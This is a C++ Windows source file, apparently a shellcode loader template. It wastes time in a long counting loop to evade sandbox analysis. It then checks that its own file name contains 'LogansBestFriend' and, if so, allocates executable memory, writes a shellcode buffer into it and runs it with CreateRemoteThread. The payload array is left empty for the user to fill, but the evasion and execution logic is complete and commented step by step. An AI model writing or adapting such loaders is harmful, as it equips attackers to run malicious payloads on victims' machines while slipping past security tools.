#include "Windows.h"
#include "stdio.h"
#include <iostream>
#include <string>
#include <regex>

#define MAX_OP 89888996 // Define a constant MAX_OP with a value of 89888996
void shellcode(); // Declare the shellcode function

using namespace std;

int main(int argc, char *argv[])
{
    char path [MAX_PATH]; // Declare a character array to hold the file path
    int cpt = 0; // Initialize an integer variable cpt to 0
    int i = 0; // Initialize an integer variable i to 0
    for (i = 0; i < MAX_OP; i++) // Loop MAX_OP times and increment cpt each time
    {
        cpt++;
    }
    if (cpt == MAX_OP) // Check if cpt is equal to MAX_OP
    {
        GetModuleFileNameA(NULL, path, MAX_PATH); // Get the file path of the current module
        regex str_expr ("(.*)(LogansBestFriend)(.*)"); // Define a regular expression pattern
        
        if (regex_match (path,str_expr)) { // Check if the file path matches the regular expression pattern
            shellcode(); // Call the shellcode function
        }
    }
    return 0; // Return 0 to indicate successful program execution
}

void shellcode() // Define the shellcode function
{
    
    
    /* length: 925 bytes */
    unsigned char shellcode[] = ""; // Enter shellcode here

    HANDLE processHandle;
    HANDLE remoteThread; 
    PVOID remoteBuffer;

    DWORD pnameid = GetCurrentProcessId(); // Get the ID of the current process
    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pnameid); // Open the current process with all access rights
    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); // Allocate memory in the current process for the shellcode
    WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL); // Write the shellcode to the remote buffer
    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL); // Create a remote thread to execute the shellcode
    CloseHandle(processHandle); // Close the process handle
    WaitForSingleObject(remoteThread, INFINITE);
    
}
